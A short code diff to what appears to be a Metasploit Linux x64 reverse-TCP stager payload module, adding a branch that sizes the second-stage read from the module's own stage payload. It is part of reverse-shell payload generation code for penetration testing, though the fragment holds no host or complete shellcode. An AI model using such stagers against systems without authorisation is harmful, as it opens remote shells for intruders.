@@ -88,12 +88,16 @@ module Payload::Linux::ReverseTcp_x64
     seconds = (opts[:sleep_seconds] || 5.0)
     sleep_seconds = seconds.to_i
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
+
     if respond_to?(:generate_intermediate_stage)
       pay_mod = framework.payloads.create(self.refname)
       read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+    elsif !module_info['Stage']['Payload'].empty?
+      read_length = module_info['Stage']['Payload'].size
     else
       read_length = 4096
     end
+
     asm = %Q^
       mmap:
         xor    rdi, rdi
